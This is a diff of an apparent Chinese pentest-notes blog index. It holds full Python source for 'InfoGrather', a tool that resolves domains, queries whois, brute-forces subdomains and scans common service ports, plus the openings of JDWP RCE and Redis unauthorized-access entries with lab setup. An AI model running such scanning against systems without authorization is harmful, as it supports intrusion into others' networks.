function_">__init__</span>(<span class="params">self, domain, port, file</span>):</span><br><span class="line">        self.domain = domain</span><br><span class="line">        self.port = port</span><br><span class="line">        self.file = file</span><br><span class="line">        start_time = time.time()</span><br><span class="line">        <span class="keyword">if</span> self.domain != <span class="string">&quot;&quot;</span>:</span><br><span class="line">            self.resolve_ip()</span><br><span class="line">            self.whois_query()</span><br><span class="line">        <span class="keyword">if</span> self.domain != <span class="string">&quot;&quot;</span> <span class="keyword">and</span> self.file <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;子域名扫描结果=================================&quot;</span>)</span><br><span class="line">            ran = self.ran_str(<span class="number">6</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                socket.gethostbyname(ran + <span class="string">&quot;.&quot;</span> + self.domain)</span><br><span class="line">            <span class="keyword">except</span> socket.error:</span><br><span class="line">                <span class="built_in">print</span>(self.domain + <span class="string">&quot;不是泛解析，暴破结果如下↓↓↓↓↓↓↓↓↓↓↓↓↓&quot;</span>)</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(self.file, mode=<span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    subdomain_list = f.readlines()</span><br><span class="line">                    f.close()</span><br><span class="line">                <span class="keyword">with</span> ThreadPoolExecutor(<span class="number">50</span>) <span class="keyword">as</span> t:</span><br><span class="line">                    <span class="keyword">for</span> sub <span class="keyword">in</span> subdomain_list:</span><br><span class="line">                        subdomain = sub.strip(<span class="string">&quot;\n&quot;</span>) + <span class="string">&quot;.&quot;</span> + self.domain</span><br><span class="line">                        t.submit(self.subdomain_burst, subdomain=subdomain)</span><br><span class="line">        <span class="keyword">if</span> self.domain != <span class="string">&quot;&quot;</span> <span class="keyword">and</span> self.port != <span class="string">&quot;&quot;</span>:</span><br><span class="line">            self.port_scan()</span><br><span class="line">        end_time = time.time()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;本次检查共耗时: &quot;</span> + <span class="built_in">str</span>(<span class="built_in">int</span>(end_time-start_time)) + <span class="string">&quot;s&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">resolve_ip</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ip解析结果=====================================&quot;</span>)</span><br><span class="line">        url = <span class="string">&quot;https://site.ip138.com/domain/read.do?domain=&quot;</span> + self.domain + <span class="string">&quot;&amp;time=&quot;</span> + <span class="built_in">str</span>(time.time())</span><br><span class="line">        resp = requests.get(url=url, headers=headers).json()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> resp[<span class="string">&quot;data&quot;</span>]:</span><br><span class="line">                ip = i[<span class="string">&quot;ip&quot;</span>]</span><br><span class="line">                sign = i[<span class="string">&quot;sign&quot;</span>]</span><br><span class="line">                url = <span class="string">&quot;https://api.ip138.com/query/?ip=&quot;</span> + ip + <span class="string">&quot;&amp;oid=5&amp;mid=5&amp;datatype=jsonp&amp;sign=&quot;</span> + sign</span><br><span class="line">                resp2 = requests.get(url=url, headers=headers).json()</span><br><span class="line">                position = resp2[<span class="string">&quot;data&quot;</span>]</span><br><span class="line">                <span class="built_in">print</span>(ip + <span class="string">&quot;==&gt;&quot;</span> + <span class="built_in">str</span>(position))</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;site.ip138.com不支持该域名解析或存在缓存==&gt;&quot;</span> + <span class="built_in">str</span>(e))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">whois_query</span>(<span class="params">self</span>):</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;domain&quot;</span>: self.domain</span><br><span class="line">        &#125;</span><br><span class="line">        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line">        resp = requests.post(url=<span class="string">&quot;https://www.hostinger.com.hk/whois&quot;</span>, headers=headers, data=data,verify=<span class="literal">False</span>).content.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        obj = re.<span class="built_in">compile</span>(<span class="string">r&quot;Creation Date: (?P&lt;create_time&gt;.*?)\\r\\n(.*?)&quot;</span></span><br><span class="line">                         <span class="string">r&quot;Expiration Date: (?P&lt;expiration_time&gt;.*?)\\r\\n(.*?)&quot;</span></span><br><span class="line">                         <span class="string">r&quot;Registrar: (?P&lt;registrar&gt;.*?)\\r\\nRegistrar(.*?)&quot;</span></span><br><span class="line">                         <span class="string">r&quot;Domain Status: (?P&lt;status&gt;.*?)\\r\\n(.*?)&quot;</span></span><br><span class="line">                         <span class="string">r&quot;Name Server: (?P&lt;dns&gt;.*?)\\r\\nDNSSEC(.*?)&quot;</span></span><br><span class="line">                         <span class="string">r&quot;Contact Email: (?P&lt;email&gt;.*?)\\r\\n(.*?)&quot;</span></span><br><span class="line">                         <span class="string">r&quot;Contact Phone: (?P&lt;phone&gt;.*?)\\r\\n&quot;</span>, re.S)</span><br><span class="line">        result = obj.finditer(resp)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;whois查询结果==================================&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> result:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;创建时间: &quot;</span> + i.group(<span class="string">&#x27;create_time&#x27;</span>))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;过期时间: &quot;</span> + i.group(<span class="string">&#x27;expiration_time&#x27;</span>))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;注册商: &quot;</span> + i.group(<span class="string">&#x27;registrar&#x27;</span>))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;状态: &quot;</span> + i.group(<span class="string">&#x27;status&#x27;</span>).replace(<span class="string">&quot;\\&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;DNS: &quot;</span> + i.group(<span class="string">&#x27;dns&#x27;</span>))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;注册邮箱: &quot;</span> + i.group(<span class="string">&#x27;email&#x27;</span>))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;注册电话: &quot;</span> + i.group(<span class="string">&#x27;phone&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">subdomain_burst</span>(<span class="params">subdomain</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            ip = socket.gethostbyname(subdomain)</span><br><span class="line">            <span class="built_in">print</span>(subdomain + <span class="string">&quot; ==&gt; &quot;</span> + ip)</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        <span class="keyword">except</span> socket.error:</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">port_scan</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;端口扫描结果===================================&quot;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">for</span> port <span class="keyword">in</span> self.port:</span><br><span class="line">                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">                sock.settimeout(<span class="number">0.1</span>)</span><br><span class="line">                state = sock.connect_ex((self.domain, port))</span><br><span class="line">                <span class="keyword">if</span> <span class="number">0</span> == state:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;port: &#123;&#125; is open&quot;</span>.<span class="built_in">format</span>(port))</span><br><span class="line">                sock.close()</span><br><span class="line">        <span class="keyword">except</span> socket.error:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">ran_str</span>(<span class="params">str_num</span>):</span><br><span class="line">        str1 = <span class="string">&#x27;1234567890abcdefghijklnmopqrstuvwxyzABCDEFGHIJKLNMOPQRSTUVWXYZ&#x27;</span></span><br><span class="line">        ran_string = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(str_num):</span><br><span class="line">            num = random.randint(<span class="number">0</span>, <span class="built_in">len</span>(str1) - <span class="number">1</span>)</span><br><span class="line">            ran_string += str1[num]</span><br><span class="line">        <span class="keyword">return</span> ran_string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">r&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">      ___       __        ___          _   _            </span></span><br><span class="line"><span class="string">     |_ _|_ _  / _|___   / __|_ _ __ _| |_| |_  ___ _ _ </span></span><br><span class="line"><span class="string">      | || &#x27; \|  _/ _ \ | (_ | &#x27;_/ _` |  _| &#x27; \/ -_) &#x27;_|</span></span><br><span class="line"><span class="string">     |___|_||_|_| \___/  \___|_| \__,_|\__|_||_\___|_|  InfoGrather 1.0 by qiwent@idi                                    </span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br><span class="line">    parse = argparse.ArgumentParser()</span><br><span class="line">    parse.add_argument(<span class="string">&quot;-d&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="literal">None</span>, <span class="built_in">help</span>=<span class="string">&quot;Target domain name&quot;</span>, dest=<span class="string">&quot;domain&quot;</span>)</span><br><span class="line">    parse.add_argument(<span class="string">&quot;-f&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="literal">None</span>, <span class="built_in">help</span>=<span class="string">&quot;Subdomain burst dictionary file&quot;</span>, dest=<span class="string">&quot;file&quot;</span>)</span><br><span class="line">    parse.add_argument(<span class="string">&quot;-p&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=[<span class="number">21</span>,<span class="number">23</span>,<span class="number">80</span>,<span class="number">81</span>,<span class="number">82</span>,<span class="number">83</span>,<span class="number">84</span>,<span class="number">85</span>,<span class="number">86</span>,<span class="number">87</span>,<span class="number">88</span>,<span class="number">89</span>,<span class="number">90</span>,<span class="number">135</span>,<span class="number">137</span>,<span class="number">161</span>,<span class="number">389</span>,<span class="number">443</span>,<span class="number">445</span>,<span class="number">873</span>,<span class="number">1099</span>,</span><br><span class="line">                                                <span class="number">1433</span>,<span class="number">1521</span>,<span class="number">1900</span>,<span class="number">2082</span>,<span class="number">2181</span>,<span class="number">2222</span>,<span class="number">2375</span>,<span class="number">2376</span>,<span class="number">2601</span>,<span class="number">2604</span>,<span class="number">3128</span>,<span class="number">3306</span>,<span class="number">3311</span>,<span class="number">3312</span>,</span><br><span class="line">                                                <span class="number">3389</span>,<span class="number">4440</span>,<span class="number">4848</span>,<span class="number">5001</span>,<span class="number">5432</span>,<span class="number">5560</span>,<span class="number">5900</span>,<span class="number">5901</span>,<span class="number">5902</span>,<span class="number">6082</span>,<span class="number">6379</span>,<span class="number">7001</span>,<span class="number">7002</span>,<span class="number">7003</span>,</span><br><span class="line">                                                <span class="number">7004</span>,<span class="number">7005</span>,<span class="number">7006</span>,<span class="number">7007</span>,<span class="number">7008</span>,<span class="number">7009</span>,<span class="number">7010</span>,<span class="number">7778</span>,<span class="number">8009</span>,<span class="number">8080</span>,<span class="number">8081</span>,<span class="number">8082</span>,<span class="number">8083</span>,<span class="number">8084</span>,</span><br><span class="line">                                                <span class="number">8085</span>,<span class="number">8086</span>,<span class="number">8087</span>,<span class="number">8088</span>,<span class="number">8089</span>,<span class="number">8090</span>,<span class="number">8649</span>,<span class="number">8888</span>,<span class="number">9000</span>,<span class="number">9200</span>,<span class="number">10000</span>,<span class="number">11211</span>,<span class="number">27017</span>,</span><br><span class="line">                                                <span class="number">28017</span>,<span class="number">50000</span>,<span class="number">51111</span>,<span class="number">50030</span>,<span class="number">50060</span>], <span class="built_in">help</span>=<span class="string">&quot;Port scan, default 81 ports&quot;</span>, dest=<span class="string">&quot;port&quot;</span>)</span><br><span class="line">    arg = parse.parse_args()</span><br><span class="line">    InfoGather(domain=arg.domain, port=arg.port, file=arg.file)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>MyTools</category>
-      </categories>
-  </entry>
-  <entry>
     <title>JDWP RCE</title>
     <url>/pages/%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80/Java/Jdwp.html</url>
     <content><![CDATA[<h1 id="JDWP-RCE">1. JDWP RCE</h1><h2 id="漏洞说明">1.1. 漏洞说明:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在渗透测试的过程中，如果遇到目标Java应用开启了JDWP服务且没有配置访问控制的情况下，就可以利用JDWP实现远程代码执行。</span><br></pre></td></tr></table></figure>
@@ -331,6 +319,18 @@
       <categories>
         <category>高级语言</category>
         <category>Java</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>InfoGrather</title>
+    <url>/pages/MyTools/InfoGrather.html</url>
+    <content><![CDATA[<h1 id="InfoGrather">1. InfoGrather</h1><p>InfoGrather(信息收集)可以自动化进行域名解析成IP，whois查询，子域名暴破(可以检测泛解析)，基础端口的扫描，使用方法<code>python3 InfoGrather.py -d 域名 -f 子域目录地址</code></p>
+<h2 id="使用效果">1.1. 使用效果</h2><p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221228094107704.png" alt="image-20221228094107704"></p>
+<h2 id="源码">1.2. 源码</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">InfoGather</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, domain, port, file</span>):</span><br><span class="line">        self.domain = domain</span><br><span class="line">        self.port = port</span><br><span class="line">        self.file = file</span><br><span class="line">        start_time = time.time()</span><br><span class="line">        <span class="keyword">if</span> self.domain != <span class="string">&quot;&quot;</span>:</span><br><span class="line">            self.resolve_ip()</span><br><span class="line">            self.whois_query()</span><br><span class="line">        <span class="keyword">if</span> self.domain != <span class="string">&quot;&quot;</span> <span class="keyword">and</span> self.file <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;子域名扫描结果=================================&quot;</span>)</span><br><span class="line">            ran = self.ran_str(<span class="number">6</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                socket.gethostbyname(ran + <span class="string">&quot;.&quot;</span> + self.domain)</span><br><span class="line">            <span class="keyword">except</span> socket.error:</span><br><span class="line">                <span class="built_in">print</span>(self.domain + <span class="string">&quot;不是泛解析，暴破结果如下↓↓↓↓↓↓↓↓↓↓↓↓↓&quot;</span>)</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(self.file, mode=<span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    subdomain_list = f.readlines()</span><br><span class="line">                    f.close()</span><br><span class="line">                <span class="keyword">with</span> ThreadPoolExecutor(<span class="number">50</span>) <span class="keyword">as</span> t:</span><br><span class="line">                    <span class="keyword">for</span> sub <span class="keyword">in</span> subdomain_list:</span><br><span class="line">                        subdomain = sub.strip(<span class="string">&quot;\n&quot;</span>) + <span class="string">&quot;.&quot;</span> + self.domain</span><br><span class="line">                        t.submit(self.subdomain_burst, subdomain=subdomain)</span><br><span class="line">        <span class="keyword">if</span> self.domain != <span class="string">&quot;&quot;</span> <span class="keyword">and</span> self.port != <span class="string">&quot;&quot;</span>:</span><br><span class="line">            self.port_scan()</span><br><span class="line">        end_time = time.time()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;本次检查共耗时: &quot;</span> + <span class="built_in">str</span>(<span class="built_in">int</span>(end_time-start_time)) + <span class="string">&quot;s&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">resolve_ip</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ip解析结果=====================================&quot;</span>)</span><br><span class="line">        url = <span class="string">&quot;https://site.ip138.com/domain/read.do?domain=&quot;</span> + self.domain + <span class="string">&quot;&amp;time=&quot;</span> + <span class="built_in">str</span>(time.time())</span><br><span class="line">        resp = requests.get(url=url, headers=headers).json()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> resp[<span class="string">&quot;data&quot;</span>]:</span><br><span class="line">                ip = i[<span class="string">&quot;ip&quot;</span>]</span><br><span class="line">                sign = i[<span class="string">&quot;sign&quot;</span>]</span><br><span class="line">                url = <span class="string">&quot;https://api.ip138.com/query/?ip=&quot;</span> + ip + <span class="string">&quot;&amp;oid=5&amp;mid=5&amp;datatype=jsonp&amp;sign=&quot;</span> + sign</span><br><span class="line">                resp2 = requests.get(url=url, headers=headers).json()</span><br><span class="line">                position = resp2[<span class="string">&quot;data&quot;</span>]</span><br><span class="line">                <span class="built_in">print</span>(ip + <span class="string">&quot;==&gt;&quot;</span> + <span class="built_in">str</span>(position))</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;site.ip138.com不支持该域名解析或存在缓存==&gt;&quot;</span> + <span class="built_in">str</span>(e))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">whois_query</span>(<span class="params">self</span>):</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;domain&quot;</span>: self.domain</span><br><span class="line">        &#125;</span><br><span class="line">        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line">        resp = requests.post(url=<span class="string">&quot;https://www.hostinger.com.hk/whois&quot;</span>, headers=headers, data=data,verify=<span class="literal">False</span>).content.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        obj = re.<span class="built_in">compile</span>(<span class="string">r&quot;Creation Date: (?P&lt;create_time&gt;.*?)\\r\\n(.*?)&quot;</span></span><br><span class="line">                         <span class="string">r&quot;Expiration Date: (?P&lt;expiration_time&gt;.*?)\\r\\n(.*?)&quot;</span></span><br><span class="line">                         <span class="string">r&quot;Registrar: (?P&lt;registrar&gt;.*?)\\r\\nRegistrar(.*?)&quot;</span></span><br><span class="line">                         <span class="string">r&quot;Domain Status: (?P&lt;status&gt;.*?)\\r\\n(.*?)&quot;</span></span><br><span class="line">                         <span class="string">r&quot;Name Server: (?P&lt;dns&gt;.*?)\\r\\nDNSSEC(.*?)&quot;</span></span><br><span class="line">                         <span class="string">r&quot;Contact Email: (?P&lt;email&gt;.*?)\\r\\n(.*?)&quot;</span></span><br><span class="line">                         <span class="string">r&quot;Contact Phone: (?P&lt;phone&gt;.*?)\\r\\n&quot;</span>, re.S)</span><br><span class="line">        result = obj.finditer(resp)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;whois查询结果==================================&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> result:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;创建时间: &quot;</span> + i.group(<span class="string">&#x27;create_time&#x27;</span>))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;过期时间: &quot;</span> + i.group(<span class="string">&#x27;expiration_time&#x27;</span>))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;注册商: &quot;</span> + i.group(<span class="string">&#x27;registrar&#x27;</span>))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;状态: &quot;</span> + i.group(<span class="string">&#x27;status&#x27;</span>).replace(<span class="string">&quot;\\&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;DNS: &quot;</span> + i.group(<span class="string">&#x27;dns&#x27;</span>))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;注册邮箱: &quot;</span> + i.group(<span class="string">&#x27;email&#x27;</span>))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;注册电话: &quot;</span> + i.group(<span class="string">&#x27;phone&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">subdomain_burst</span>(<span class="params">subdomain</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            ip = socket.gethostbyname(subdomain)</span><br><span class="line">            <span class="built_in">print</span>(subdomain + <span class="string">&quot; ==&gt; &quot;</span> + ip)</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        <span class="keyword">except</span> socket.error:</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">port_scan</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;端口扫描结果===================================&quot;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">for</span> port <span class="keyword">in</span> self.port:</span><br><span class="line">                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">                sock.settimeout(<span class="number">0.1</span>)</span><br><span class="line">                state = sock.connect_ex((self.domain, port))</span><br><span class="line">                <span class="keyword">if</span> <span class="number">0</span> == state:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;port: &#123;&#125; is open&quot;</span>.<span class="built_in">format</span>(port))</span><br><span class="line">                sock.close()</span><br><span class="line">        <span class="keyword">except</span> socket.error:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">ran_str</span>(<span class="params">str_num</span>):</span><br><span class="line">        str1 = <span class="string">&#x27;1234567890abcdefghijklnmopqrstuvwxyzABCDEFGHIJKLNMOPQRSTUVWXYZ&#x27;</span></span><br><span class="line">        ran_string = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(str_num):</span><br><span class="line">            num = random.randint(<span class="number">0</span>, <span class="built_in">len</span>(str1) - <span class="number">1</span>)</span><br><span class="line">            ran_string += str1[num]</span><br><span class="line">        <span class="keyword">return</span> ran_string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">r&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">      ___       __        ___          _   _            </span></span><br><span class="line"><span class="string">     |_ _|_ _  / _|___   / __|_ _ __ _| |_| |_  ___ _ _ </span></span><br><span class="line"><span class="string">      | || &#x27; \|  _/ _ \ | (_ | &#x27;_/ _` |  _| &#x27; \/ -_) &#x27;_|</span></span><br><span class="line"><span class="string">     |___|_||_|_| \___/  \___|_| \__,_|\__|_||_\___|_|  InfoGrather 1.0 by qiwent@idi                                    </span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br><span class="line">    parse = argparse.ArgumentParser()</span><br><span class="line">    parse.add_argument(<span class="string">&quot;-d&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="literal">None</span>, <span class="built_in">help</span>=<span class="string">&quot;Target domain name&quot;</span>, dest=<span class="string">&quot;domain&quot;</span>)</span><br><span class="line">    parse.add_argument(<span class="string">&quot;-f&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="literal">None</span>, <span class="built_in">help</span>=<span class="string">&quot;Subdomain burst dictionary file&quot;</span>, dest=<span class="string">&quot;file&quot;</span>)</span><br><span class="line">    parse.add_argument(<span class="string">&quot;-p&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=[<span class="number">21</span>,<span class="number">23</span>,<span class="number">80</span>,<span class="number">81</span>,<span class="number">82</span>,<span class="number">83</span>,<span class="number">84</span>,<span class="number">85</span>,<span class="number">86</span>,<span class="number">87</span>,<span class="number">88</span>,<span class="number">89</span>,<span class="number">90</span>,<span class="number">135</span>,<span class="number">137</span>,<span class="number">161</span>,<span class="number">389</span>,<span class="number">443</span>,<span class="number">445</span>,<span class="number">873</span>,<span class="number">1099</span>,</span><br><span class="line">                                                <span class="number">1433</span>,<span class="number">1521</span>,<span class="number">1900</span>,<span class="number">2082</span>,<span class="number">2181</span>,<span class="number">2222</span>,<span class="number">2375</span>,<span class="number">2376</span>,<span class="number">2601</span>,<span class="number">2604</span>,<span class="number">3128</span>,<span class="number">3306</span>,<span class="number">3311</span>,<span class="number">3312</span>,</span><br><span class="line">                                                <span class="number">3389</span>,<span class="number">4440</span>,<span class="number">4848</span>,<span class="number">5001</span>,<span class="number">5432</span>,<span class="number">5560</span>,<span class="number">5900</span>,<span class="number">5901</span>,<span class="number">5902</span>,<span class="number">6082</span>,<span class="number">6379</span>,<span class="number">7001</span>,<span class="number">7002</span>,<span class="number">7003</span>,</span><br><span class="line">                                                <span class="number">7004</span>,<span class="number">7005</span>,<span class="number">7006</span>,<span class="number">7007</span>,<span class="number">7008</span>,<span class="number">7009</span>,<span class="number">7010</span>,<span class="number">7778</span>,<span class="number">8009</span>,<span class="number">8080</span>,<span class="number">8081</span>,<span class="number">8082</span>,<span class="number">8083</span>,<span class="number">8084</span>,</span><br><span class="line">                                                <span class="number">8085</span>,<span class="number">8086</span>,<span class="number">8087</span>,<span class="number">8088</span>,<span class="number">8089</span>,<span class="number">8090</span>,<span class="number">8649</span>,<span class="number">8888</span>,<span class="number">9000</span>,<span class="number">9200</span>,<span class="number">10000</span>,<span class="number">11211</span>,<span class="number">27017</span>,</span><br><span class="line">                                                <span class="number">28017</span>,<span class="number">50000</span>,<span class="number">51111</span>,<span class="number">50030</span>,<span class="number">50060</span>], <span class="built_in">help</span>=<span class="string">&quot;Port scan, default 81 ports&quot;</span>, dest=<span class="string">&quot;port&quot;</span>)</span><br><span class="line">    arg = parse.parse_args()</span><br><span class="line">    InfoGather(domain=arg.domain, port=arg.port, file=arg.file)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>MyTools</category>
       </categories>
   </entry>
   <entry>
@@ -555,6 +555,26 @@
       </categories>
   </entry>
   <entry>
+    <title>Redis</title>
+    <url>/pages/%E6%95%B0%E6%8D%AE%E5%BA%93/Redis.html</url>
+    <content><![CDATA[<h1 id="redis未授权访问">1. redis未授权访问</h1><h2 id="风险描述：">1.1. 风险描述：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Redis 未授权访问是因为一些 Redis 服务绑定到公共接口，甚至没有密码身份验证保护。部分 Redis 绑定在0.0.0.0:6379，并且没有开启认证（这是 Redis 的默认配置），而又暴露在公网上，这样就会导致任意用户在可以访问此公网的情况下未授权访问 Redis 以及读取Redis 的数据。</span><br></pre></td></tr></table></figure>
+
+<p>More info : 该服务默认开放端口6379</p>
+<h2 id="环境搭建：">1.2. 环境搭建：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">攻击者 Kali 192.168.179.129 </span><br><span class="line">靶机 ubuntu 192.168.179.130 -- 需安装 redis 环境</span><br><span class="line"></span><br><span class="line">		靶机部署：</span><br><span class="line">		wget http://download.redis.io/releases/redis-3.2.11.tar.gz	// 下载redis安装包</span><br><span class="line">		tar zxvf redis-3.2.11.tar.gz // 解压</span><br><span class="line">		cd redis-3.2.11</span><br><span class="line">		make // 进入解压目录后make执行</span><br><span class="line">		cd src</span><br><span class="line">		sudo cp redis-server /usr/bin </span><br><span class="line">		sudo cp redis-cli /usr/bin // 配置环境变量</span><br><span class="line">		cd ..</span><br><span class="line">		sudo cp redis.conf /etc // 将 redis.conf 复制到 etc 目录下</span><br><span class="line">		vim /etc/redis.conf</span><br><span class="line">			Protected-mode yes 改为 no</span><br><span class="line">			bind 127.0.0.1 之前加上#</span><br><span class="line">		redis-server /etc/redis.conf // 开启 redis 服务</span><br><span class="line">		</span><br><span class="line">		sudo apt install openssh-server // 安装 ssh 服务</span><br><span class="line">		systemctl start sshd</span><br></pre></td></tr></table></figure>
+
